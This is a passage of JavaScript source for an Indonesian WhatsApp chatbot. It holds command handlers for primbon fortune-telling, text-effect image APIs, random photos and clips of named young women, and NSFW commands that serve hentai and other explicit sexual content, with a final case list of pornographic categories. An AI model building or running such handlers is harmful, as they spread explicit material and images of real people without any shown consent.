			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(`Example : ${prefix + command} 12, 1, 2004`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendText(m.chat, `⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Info :* ${anu.message.info}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
            case 'harinaas': case 'harisial': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(`Example : ${prefix + command} 12, 1, 2004`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hari Naas :* ${anu.message.hari_naas}\n⭔ *Info :* ${anu.message.catatan}\n⭔ *Catatan :* ${anu.message.info}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
            case 'nagahari': case 'harinaga': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(`Example : ${prefix + command} 12, 1, 2004`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.rahasia_naga_hari(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *Tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Naga Hari :* ${anu.message.arah_naga_hari}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
            case 'arahrejeki': case 'arahrezeki': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(`Example : ${prefix + command} 12, 1, 2004`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendText(m.chat, `⭔ *Hari Lahir :* ${anu.message.hari_lahir}\n⭔ *tanggal Lahir :* ${anu.message.tgl_lahir}\n⭔ *Arah Rezeki :* ${anu.message.arah_rejeki}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
            case 'peruntungan': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(`Example : ${prefix + command} Zeeone, 12, 1, 2004, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`)
                let [nama, tgl, bln, thn, untuk] = text.split`,`
                let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Peruntungan Tahun :* ${anu.message.peruntungan_tahun}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
            case 'weton': case 'wetonjawa': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `???? Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(`Example : ${prefix + command} 12, 1, 2004`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.weton_jawa(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tanggal}\n⭔ *Jumlah Neptu :* ${anu.message.jumlah_neptu}\n⭔ *Watak Hari :* ${anu.message.watak_hari}\n⭔ *Naga Hari :* ${anu.message.naga_hari}\n⭔ *Jam Baik :* ${anu.message.jam_baik}\n⭔ *Watak Kelahiran :* ${anu.message.watak_kelahiran}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
            case 'sifat': case 'karakter': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
				if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(`Example : ${prefix + command} Zeeone,12, 1, 2004`)
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Garis Hidup :* ${anu.message.garis_hidup}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
            case 'keberuntungan': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(`Example : ${prefix + command} Zeeone, 12, 1, 2004`)
                let [nama, tgl, bln, thn] = text.split`,`
                let anu = await primbon.potensi_keberuntungan(nama, tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendText(m.chat, `⭔ *Nama :* ${anu.message.nama}\n⭔ *Lahir :* ${anu.message.tgl_lahir}\n⭔ *Hasil :* ${anu.message.result}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
            case 'memancing': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(`Example : ${prefix + command} 12, 1, 2022`)
                let [tgl, bln, thn] = text.split`,`
                let anu = await primbon.primbon_memancing_ikan(tgl, bln, thn)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendText(m.chat, `⭔ *Tanggal :* ${anu.message.tgl_memancing}\n⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break
            case 'masasubur': {
            	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
                if (!text) return reply(`Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`)
                let [tgl, bln, thn, siklus] = text.split`,`
                let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
                if (anu.status == false) return m.reply(anu.message)
                alpha.sendText(m.chat, `⭔ *Hasil :* ${anu.message.result}\n⭔ *Catatan :* ${anu.message.catatan}`, m)
            }
            db.data.users[m.sender].limit -= 1
            break 
            case 'ppcp': case 'ppcouple': case 'couple':{
	 let data = fs.readFileSync('./lib/ppcp.js');
     let  jsonData = JSON.parse(data);
     let randIndex = Math.floor(Math.random() * jsonData.length);
     let json = jsonData[randIndex];
     let randCowo= await getBuffer(json.cowo)
     alpha.sendMessage(m.chat, { image: randCowo, caption: '*Boy*', quoted: m })
	 let randCewe = await getBuffer(json.cewe)
     alpha.sendMessage(m.chat, { image: randCewe, caption: '*Girl*', quoted: m })
            	}
            break
//ephoto360
case 'youtubegold':case 'youtubesilver':case 'facebookgold':case 'facebooksilver':case 'instagramgold':case 'instagramsilver':case 'twittergold':case 'twittersilver':case 'retrotext':case 'halloweenbats':case 'texthalloween':case 'cardhalloween':case 'birthdaycake':case 'thundertext':case 'icetext':case 'milkcake':case 'snowontext':case 'metalstar':case 'dragonfire':case 'zombie3d':case 'merrycard':case 'generalexam': case 'viettel':case 'embroider':case 'graffititext':case 'graffititext2':case 'graffititext3':case 'covergraffiti':case 'moderngold':case 'capercut':case 'lovecard':case 'heartflashlight':case 'heartcup':case 'sunglightshadow':case 'graffiti3d':case 'moderngoldsilver':case 'moderngold2':case 'modengold3':case 'fabrictext':case 'masteryavatar':case 'messagecoffee':case 'announofwin':case 'writeblood':case 'horrorletter':case 'writehorror':case 'shirtclub':case 'angelwing':case 'christmasseason':case 'projectyasuo':case 'lovelycute':case 'womansday':case 'covergamepubg':case 'nameonheart':case 'funnyhalloween':case 'lightningpubg':case 'greetingcardvideo': case 'christmascard': case 'galaxybat':case 'writegalaxy':case 'starsnight':case 'noeltext':case 'textcakes':case 'pubgbirthday':case 'galaxywallpaper':case 'pubgglicthvideo': case 'pubgmascotlogo':case 'realembroidery':case 'vintagetelevision':case 'funnyanimations':case 'glowingtext':case 'textonglass':case 'cartoonstyle':case 'multicolor':case 'watercolor2':case 'textsky':case 'summerbeach':case '1917text':case 'puppycute':case 'rosebirthday':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
			if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.NoTeksOne(prefix, command))
reply(lang.wait())
let res = await fetch(global.api('alfa', '/api/ephoto360/'+command, {text:text}, 'apikey'))
if (!res.ok) return await res.text()
let img = await res.buffer()
alpha.sendFile(m.chat, img, 'ephoto.jpg', lang.ok(), m)
db.data.users[m.sender].limit -= 1
}
            
break
case 'steellettering':case 'letterstext':case 'barcashirt':case 'premiercup':case 'stylepoligon':case 'lifebuoys':case 'juventusshirt':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.NoTeksTwo(prefix, command))
if (!text.includes('|')) return reply(lang.NoTeksTwo(prefix, command))
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
reply(lang.wait())
let res = await fetch(global.api('alfa', '/api/ephoto360/'+command, {text:m1 , text2:m2}, 'apikey'))
if (!res.ok) return await res.text()
let img = await res.buffer()
alpha.sendFile(m.chat, img, 'ephoto.jpg', lang.ok(), m)
db.data.users[m.sender].limit -= 1
}
break

case 'horror':case 'game8bit':case 'layered':case 'glitch2':case 'coolg':case 'coolwg':case 'realistic':case 'space3d':case 'gtiktok':case 'stone':case 'marvel':case 'marvel2':case 'pornhub':case 'avengers':case 'metalr':case 'metalg':case 'metalg2':case 'lion':case 'wolf_bw':case 'wolf_g':case 'ninja':case '3dsteel':case 'horror2':case 'lava':case 'bagel':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.NoTeksTwo(prefix, command))
if (!text.includes('|')) return reply(lang.NoTeksTwo(prefix, command))
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
reply(lang.wait())
let res = await fetch(global.api(global.APIs.alfa, '/api/textpro/'+command, {text:m1 , text2: m2}, 'apikey'))
if (!res.ok) return await res.text()
let img = await res.buffer()
alpha.sendFile(m.chat, img, 'textpro.jpg', lang.ok(), m)
db.data.users[m.sender].limit -= 1
}
break 

case 'battlegrounds-logo':
case 'battlefield4': case 'text-8bit':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.NoTeksTwo(prefix, command))
if (!text.includes('|')) return reply(lang.NoTeksTwo(prefix, command))
mm = args.join(' ')
m1 = mm.split("|")[0];
m2 = mm.split("|")[1]; 
reply(lang.wait())
let res = await fetch(global.api(global.APIs.alfa, '/api/photooxy/'+command, {text:m1 , text2: m2}, 'apikey'))
if (!res.ok) return await res.text()
let img = await res.buffer()
alpha.sendFile(m.chat, img, 'photooxy.jpg', lang.ok(), m)
db.data.users[m.sender].limit -= 1
}
	break
case 'typography-flower': case 'under-flower': case 'bevel-text': case 'silk-text': case 'sweet-andy': case 'smoke-typography': case 'carvedwood': case 'scary-cemetery': case 'royallook': case 'coffeecup2': case 'illuminated': case 'harry-potter2': //case 'woodblack': //case 'butterfly-reflection': //case 'watermelon': // case 'striking':// case 'metallicglow': //case 'rainbow-text':
case 'birthday-cake': case 'embroidery':// case 'crisp': 
case 'flaming': case 'furtext': case 'nightsky': case 'glow-rainbow': case 'gradient-avatar': case 'white-cube': // case 'honey-text': // case 'vintage-style': //case 'glowing-3d': // case 'army-camouflage': 
case 'graffiti-cover': case 'rainbow-shine': case 'smoky-neon': case 'quotes-underfall': //case 'layered-leaves': 
case 'vector-nature': case 'yellow-rose': case 'love-text': case 'underwater-ocean': case 'nature-text': case 'wolf-metal': case 'summer-text': case 'wooden-board': //case 'flower-heart':
case 'quote-wood': case 'love-text': case 'quotes-undergrass': case 'naruto-banner': case 'love-message': case 'textoncup2': case 'burn-paper': case 'smoke': case 'romantic-messages': case 'shadow-sky': case 'text-cup': case 'coffecup':{
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.NoTeksOne(prefix, command))
reply(lang.wait())
let res = await fetch(global.api('alfa', '/api/photooxy/'+command, {text:text}, 'apikey'))
if (!res.ok) return await res.text()
let img = await res.buffer()
alpha.sendFile(m.chat, img, 'photooxy.jpg', lang.ok(), m)
db.data.users[m.sender].limit -= 1
}
	break
case 'halloween2': case 'blackpink':case 'rainbow2':case 'water_pipe':case 'halloween':case 'sketch':case 'sircuit':case 'discovery':case 'metallic2':case 'fiction':case 'demon':case 'transformer':case 'berry':case 'thunder':case 'magma':case '3dstone':case 'neon':case 'glitch':case 'harry_potter':case 'embossed':case 'broken':case 'papercut':case 'gradient':case 'glossy':case 'watercolor':case 'multicolor':case 'neon_devil':case 'underwater':case 'bear':case 'wonderfulg':case 'christmas':case 'neon_light':case 'snow':case 'cloudsky':case 'luxury2':case 'gradient2':case 'summer':case 'writing':case 'engraved':case 'summery':case '3dglue':case 'metaldark':case 'neonlight':case 'oscar':case 'minion':case 'holographic':case 'purple':case 'glossyb':case 'deluxe2':case 'glossyc':case 'fabric':case 'neonc':case 'newyear':case 'newyear2':case 'metals':case 'xmas':case 'blood':case 'darkg':case 'joker':case 'wicker':case 'natural':case 'firework':case 'skeleton':case 'balloon':case 'balloon2':case 'balloon3':case 'balloon4':case 'balloon5':case 'balloon6':case 'balloon7':case 'steel':case 'gloss':case 'denim':case 'decorate':case 'decorate2':case 'peridot':case 'rock':case 'glass':case 'glass2':case 'glass3':case 'glass4':case 'glass5':case 'glass6':case 'glass7':case 'glass8':case 'captain_as2':case 'robot':case 'equalizer':case 'toxic':case 'sparkling':case 'sparkling2':case 'sparkling3':case 'sparkling4':case 'sparkling5':case 'sparkling6':case 'sparkling7':case 'decorative':case 'chocolate':case 'strawberry':case 'koifish':case 'bread':case 'matrix':case 'blood2':case 'neonligth2':case 'thunder2':case '3dbox':case 'neon2':case 'roadw':case 'bokeh':case 'gneon':case 'advanced':case 'dropwater':case 'wall':case 'chrismast':case 'honey':case 'drug':case 'marble':case 'marble2':case 'ice':case 'juice':case 'rusty':case 'abstra':case 'biscuit':case 'wood':case 'scifi':case 'metalr':case 'purpleg':case 'shiny': case 'jewelry':case 'jewelry2':case 'jewelry3':case 'jewelry4':case 'jewelry5':case 'jewelry6':case 'jewelry7':case 'jewelry8':case 'metalh':case 'golden':case 'glitter':case 'glitter2':case 'glitter3':case 'glitter4':case 'glitter5':case 'glitter6':case 'glitter7':case 'metale':case 'carbon':case 'candy':case 'metalb':case 'gemb':case '3dchrome':case 'metalb2':case 'metalg':
{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!text) return reply(lang.NoTeksOne(prefix, command))
reply(lang.wait())
let res = await fetch(global.api('alfa', '/api/textpro/'+command, {text:text}, 'apikey'))
if (!res.ok) return await res.text()
let img = await res.buffer()
alpha.sendFile(m.chat, img, 'textpro.jpg', lang.ok(), m)
db.data.users[m.sender].limit -= 1
}
break
case 'chika': case 'rikagusriani':  case 'bocil': case 'geayubi': case 'santuy': case 'ukhty': case 'asupan':  case 'delvira': case 'ayu': case 'bunga': case 'aura': case 'nisa': case 'ziva': case 'yana': case 'viona': case 'syania': case 'riri': case 'syifa': case 'mama_gina': case 'alcakenya': case 'mangayutri': {
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
reply(lang.wait())
let res = await fetch(global.api('alfa', '/api/asupan/'+command, {}, 'apikey'))
if (!res.ok) return await res.text()
let img = await res.buffer()
alpha.sendFile(m.chat, img, 'asupan.mp4', lang.ok(), m)
db.data.users[m.sender].limit -= 1
}
break
case 'china': case 'indonesia': case 'malaysia': case 'thailand': case 'korea': case 'japan': case 'vietnam': case 'jenni': case 'jiiso': case 'lisa': case 'rose': {
	if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
reply(lang.wait())
let res = await fetch(global.api('alfa', '/api/cecan/'+command, {}, 'apikey'))
if (!res.ok) return await res.text()
let img = await res.buffer()
alpha.sendFile(m.chat, img, 'textpro.jpg', lang.ok(), m)
db.data.users[m.sender].limit -= 1
}
	break
case 'hentai': {
			if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!db.data.chats[m.chat].nsfw) return reply(lang.OffNsfw())
                reply(lang.wait())
                anu = await hentai()
                result = anu[Math.floor(Math.random(), anu.length)]
                alpha.sendMessage(m.chat, { video: { url: result.video_1 }, caption: `⭔ Title : ${result.title}\n⭔ Category : ${result.category}\n⭔ Mimetype : ${result.type}\n⭔ Views : ${result.views_count}\n⭔ Shares : ${result.share_count}\n⭔ Source : ${result.link}\n⭔ Media Url : ${result.video_1}` }, { quoted: m })
            db.data.users[m.sender].limit -= 1
}
            break
case 'cuddle':case 'foxgirl':case 'kemonomimi2':case 'woof':case 'holo2':case 'hug':case 'kiss':case 'lizard':case 'meowi':case 'neko2':case 'pat':case 'poke':case 'slap':case 'tickle':{
if(db.data.settings[botNumber].userRegister && !db.data.users[m.sender].registered) return alpha.send2ButMes(m.chat, `🇮🇩 _Hi @${m.sender.split('@')[0]} silahkan verifikasi terlebih dahulu sebelum memakai fitur bot_${enter}${enter}🇺🇸 _Hi @${m.sender.split('@')[0]} please verify first before using the bot feature_`, `© ${ownername}`, `.daftar ` + pushname, `🇺🇸 Verify`, `.daftar ` + pushname, 'Daftar 🇮🇩', fkontak,  [m.sender])
if(db.data.users[m.sender].limit < 1) return alpha.send2ButMes(m.chat, lang.Nolimit(prefix), `© ${ownername}`, `.daily`, `👉 Daily`, `.weekly`, `Weekly 👈`, m)
if (!db.data.chats[m.chat].nsfw) return reply(lang.OffNsfw())
reply(lang.wait())
let res = await fetch(global.api('alfa', '/api/sfw/'+command, {}, 'apikey'))
if (!res.ok) return await res.text()
let img = await res.buffer()
alpha.sendFile(m.chat, img, 'sfw.jpg', lang.ok(), m)
db.data.users[m.sender].limit -= 1
}
 break     
 
case 'baka':case 'smug':case 'neko_sfw':case 'hentai_gif':case 'spank':case 'blowjob':case 'cumarts':case 'eroyuri':case 'eroneko':case 'erokemonomimi':case 'erokitsune':case 'ero':case 'feet':case 'erofeet':case 'feetgif':case 'femdom':case 'futanari':case 'hentai':case 'holoero':case 'holo':case 'keta':case 'kitsune':case 'kemonomimi':case 'pussyart':case 'pussywankgif':case 'girl_solo':case 'girl_solo_gif':case 'tits':case 'trap':case 'yuri':case 'avatar2':case 'anal':case 'bj':case 'boobs':case 'classic':case 'cumsluts':case 'kuni':case 'lesbian':case 'neko':case 'neko_gif':case 'ahegao':case 'bdsm':case 'cuckold':case 'cum':case 'foot':case 'gangbang':case 'glasses':case 'jahy':case 'masturbation':case 'nsfw_neko':case 'orgy':case 'panties':case 'tentacles':case 'thighs':case 'zettai':{
